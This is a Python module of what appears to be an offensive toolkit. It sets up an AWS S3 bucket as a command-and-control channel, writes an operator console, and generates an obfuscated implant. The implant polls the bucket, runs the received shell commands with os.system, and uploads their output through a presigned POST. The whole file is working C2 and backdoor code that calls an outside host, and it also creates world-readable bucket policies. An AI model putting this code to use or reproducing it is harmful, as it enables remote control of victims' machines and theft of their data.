import boto3
from botocore.exceptions import ClientError
import logging
import json
import os
import importlib
from importlib import util

spec = importlib.util.find_spec('.subserv', package='lib')
m = spec.loader.load_module()

customfolder = m.loc + "/aMALgamation/current/SSSHHH/"
if not os.path.exists(customfolder):
    os.makedirs(customfolder)


def create_presigned_post(object_name, bucket,
                          fields=None, conditions=None, expiration=360000):
    global wss
    """Generate a presigned URL S3 POST request to upload a file

    :param bucket_name: string
    :param object_name: string
    :param fields: Dictionary of prefilled form fields
    :param conditions: List of conditions to include in the policy
    :param expiration: Time in seconds for the presigned URL to remain valid
    :return: Dictionary with the following keys:
        url: URL to post to
        fields: Dictionary of form fields and values to submit with the POST
    :return: None if error.
    """

    # Generate a presigned S3 POST URL
    try:
        response = s3.generate_presigned_post(bucket,
                                              object_name,
                                              Fields=fields,
                                              Conditions=conditions,
                                              ExpiresIn=expiration)
    except ClientError as e:
        logging.error(e)
        return None

    # The response contains the presigned URL and required fields

    website_configuration = {
        'ErrorDocument': {'Key': 'error.html'},
        'IndexDocument': {'Suffix': 'index.html'},
    }

    # Set the website configuration

    s3.put_bucket_website(Bucket=bucket,
                          WebsiteConfiguration=website_configuration)

    bucket_policy = {
        'Version': '2012-10-17',
        'Statement': [{
            'Sid': 'AddPerm',
            'Effect': 'Allow',
            'Principal': '*',
            'Action': ['s3:GetObject'],
            'Resource': f'arn:aws:s3:::%s/*' % bucket
        }]
    }

    # Convert the policy from JSON dict to string
    bucket_p = json.dumps(bucket_policy)
    s3.put_bucket_policy(Bucket=bucket, Policy=bucket_p)
    wss = response


def ssshhh():
    global s3
    print(m.bcolors.BLUE + "\t*******************************************************************" + m.bcolors.ENDC)
    print(m.bcolors.BOLD + m.bcolors.BLUE + """
        *******************************************************************
        _   _   _   _   _   _      _  
       / \ / \ / \ / \ / \ / \    / \  
      ( S | S | S | H | H | H ) ( C-2 )
       \_/ \_/ \_/ \_/ \_/ \_/    \_/ 
    """ + m.bcolors.ENDC)

    print(
        m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
    print(
        m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
    bucket = m.randomSSSHH(62)
    vic = m.randomSSSHH(9)
    c2 = m.randomSSSHH(9)
    cfile = m.randomSSSHH(9)
    project = input("What is the name of this project?: ").strip()
    key_id = input("Please put in the AWS KEY ID: ").strip()
    key_secret = input("Please put in the AWS KEY SECRET: ").strip()
    region_name = 'us-west-2'
    s3 = boto3.client('s3', region_name=region_name, aws_access_key_id=key_id, aws_secret_access_key=key_secret)
    s3.create_bucket(Bucket=bucket, ACL='public-read-write',
                     CreateBucketConfiguration={'LocationConstraint': region_name})

    create_presigned_post(vic, bucket)

    comm = """import time
import boto3
from botocore.exceptions import ClientError
import logging

bucket = "%s"
s3 = boto3.client('s3', region_name='%s', aws_access_key_id='%s', aws_secret_access_key='%s')

def upload_object(commandfile):
    # Upload the file
    try:
        s3.upload_file(commandfile, bucket, '%s')
    except ClientError as e:
        logging.error(e)
        return False
    return True


def download_object():
    # Upload the file
    try:
        s3.download_file(bucket, '%s', 'null')
        f = open("null", "r")
        print(f.read())
    except ClientError as e:
        logging.error(e)
        return False
    return True


def main():

    while 1:
        command = input("SYS:> ")
        if command == "l":
            print("Place Holder LIST Connections!")
        elif command == "LIST":
            print("Place Holder LIST Connections!")
        elif command == "L":
            print("Place Holder LIST Connections!")
        elif command == "list":
            print("Place Holder LIST Connections!")
        elif command == "List":
            print("Place Holder LIST Connections!")
        elif command == "h":
            print("Place Holder HELP!")
        elif command == "help":
            print("Place Holder HELP!")
        elif command == "HELP":
            print("Place Holder HELP!")
        elif command == "Help":
            print("Place Holder HELP!")
        elif command == "H":
            print("Place Holder HELP!")
        elif command == "q":
            print("BYE!!!")
            exit()
        elif command == "Q":
            print("BYE!!!")
            exit()
        elif command == "quit":
            print("BYE!!!")
            exit()
        elif command == "QUIT":
            print("BYE!!!")
            exit()
        else:
            file = open(".%s", "w")
            file.write(command)
            file.close()
            commandfile = ".%s"
            upload_object(commandfile)
            time.sleep(2)
            download_object()


if __name__ == '__main__':
    main()    
""" % (bucket, region_name, key_id, key_secret, c2, vic, cfile, cfile)

    command_file = open(customfolder + project + "_c2.py", "w")
    command_file.write(comm)
    command_file.close()

    payload = """import os                                                                                                                                        
try:                                                                                                                                                              
    os.system("pip3 install requests")                                                                                                                            
except:                                                                                                                                                           
    try:                                                                                                                                                          
        os.system("pip install requests")                                                                                                                         
    except:                                                                                                                                                       
        pass                                                                                                                                                      
import requests                                                                                                                                                   


"""

    func = m.randomString(6)
    temp = m.randomString(6)
    obj = m.randomString(8)
    file = m.randomString(5)
    old = m.randomString(5)
    save = m.randomString(9)
    get1 = m.randomString(7)
    check = m.randomString(10)
    com = m.randomString(5)
    body = m.randomString(6)

    payload += "def {0}():\n".format(func)
    payload += "    %s = %s\n" % (body, wss)
    payload += "    %s = os.getcwd()\n" % temp
    payload += '    {0} = {1} + ".{2}"\n'.format(obj, temp, file)
    payload += '    %s = "null"\n' % old
    payload += '    {0} = " > " + {1} + ".{2}"\n'.format(save, temp, file)
    payload += '    {0} = "https://{1}.s3-{2}.amazonaws.com/{3}"'.format(get1, bucket, region_name, c2)
    payload += """                                                                                                                                                
    while 1:                                                                                                                                                      
        {1}= requests.get({0})                                                                                                                                    
        {1}.text                                                                                                                                                  
        {2} = {1}.text.strip()                                                                                                                                    
\n""".format(get1, check, com)
    payload += "        if {0} != {1}:\n".format(com, old)
    payload += "            os.system({0} + {1})\n".format(com, save)
    payload += "            with open({0}, 'rb') as f:\n".format(obj)
    payload += "                file = {'file': (%s, f)}\n" % obj
    payload += "                requests.post({0}['url'], data={0}['fields'], files=file)\n".format(body)
    payload += "            {0} = {1}\n\n".format(old, com)
    payload += "if __name__ == '__main__':\n"
    payload += "    %s()" % func

    payload_file = open(customfolder + project + "_payload.py", "w")
    payload_file.write(payload)
    payload_file.close()

    who = "whoami"
    who_file = open(customfolder + project + "_who.txt", "w")
    who_file.write(who)
    who_file.close()

    whofile = customfolder + project + "_who.txt"
    try:
        s3.upload_file(whofile, bucket, c2)
        print("\tTest Upload Worked!!")
    except ClientError as e:
        logging.error(e)
        print("\tTest Upload didn't work.")
        pass
    os.system("rm " + whofile)
    input(m.bcolors.BLUE + "All output files will be located: " + m.bcolors.ERROR + customfolder + m.bcolors.ENDC + "\n\tPress Enter to continue!!")
    os.system("clear")